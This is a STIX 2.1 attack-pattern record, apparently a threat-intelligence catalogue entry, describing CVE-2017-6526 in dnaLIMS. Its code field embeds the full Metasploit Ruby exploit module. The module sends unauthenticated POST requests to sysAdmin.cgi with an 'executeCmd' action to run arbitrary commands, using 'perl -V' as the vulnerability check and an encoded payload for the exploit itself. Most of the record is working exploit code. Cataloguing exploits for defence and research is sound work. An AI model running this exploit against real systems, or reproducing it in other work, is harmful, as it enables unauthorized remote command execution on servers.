{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--94976166-e6db-4f2b-96cc-6f6b9ea11481",
    "created": "2024-08-14T17:03:42.959663Z",
    "modified": "2024-08-14T17:03:42.959667Z",
    "name": "dnaLIMS Admin Module Command Execution",
    "description": " This module utilizes an administrative module which allows for command execution.  This page is completely unprotected from any authentication when given a POST request. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dnalims_admin_exec.rb",
            "external_id": "dnalims_admin_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-6526"
        },
        {
            "source_name": "reference",
            "url": "https://www.shorebreaksecurity.com/blog/product-security-advisory-psa0002-dnalims/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'dnaLIMS Admin Module Command Execution',\n      'Description'    => %q{\n          This module utilizes an administrative module which allows for\n       command execution.  This page is completely unprotected from any\n       authentication when given a POST request.\n      },\n      'Author'         =>\n        [\n          'h00die <mike@shorebreaksecurity.com>',  # Discovery, PoC\n          'flakey_biscuit <nicholas@shorebreaksecurity.com>' # Discovery, PoC\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2017-6526'],\n          ['US-CERT-VU', '929263'],\n          ['URL', 'https://www.shorebreaksecurity.com/blog/product-security-advisory-psa0002-dnalims/']\n        ],\n      'Platform'       => %w( linux unix ),\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'RequiredCmd' => 'perl' # software written in perl, and guaranteed to be there\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic Target', { }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2017-03-08'\n      ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to dnaLIMS', '/cgi-bin/dna/'])\n      ], self.class\n    )\n  end\n\n  def check\n    begin\n      res = send_request_cgi(\n        'uri'       => normalize_uri(target_uri.path, 'sysAdmin.cgi'),\n        'method'    => 'POST',\n        'vars_post'  => {\n          'investigator' => '',\n          'username' => '',\n          'navUserName' => '',\n          'Action' => 'executeCmd',\n          'executeCmdData' => 'perl -V'\n        }\n      )\n      if res && res.body\n        if /Summary of/ =~ res.body\n          Exploit::CheckCode::Vulnerable\n        else\n          Exploit::CheckCode::Safe\n        end\n      else\n        Exploit::CheckCode::Safe\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\n\n  def exploit\n    begin\n      vprint_status('Sending Exploit')\n      res = send_request_cgi(\n        'uri'       => normalize_uri(target_uri.path, 'sysAdmin.cgi'),\n        'method'    => 'POST',\n        'vars_post'  => {\n          'investigator' => '',\n          'username' => '',\n          'navUserName' => '',\n          'Action' => 'executeCmd',\n          'executeCmdData' => payload.encoded,\n        }\n      )\n      vprint_good(res.body)\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\nend\n\n\n",
    "x_mitre_disclosure_date": "2017-03-08",
    "x_mitre_platforms": [
        "%w( linux unix )"
    ]
}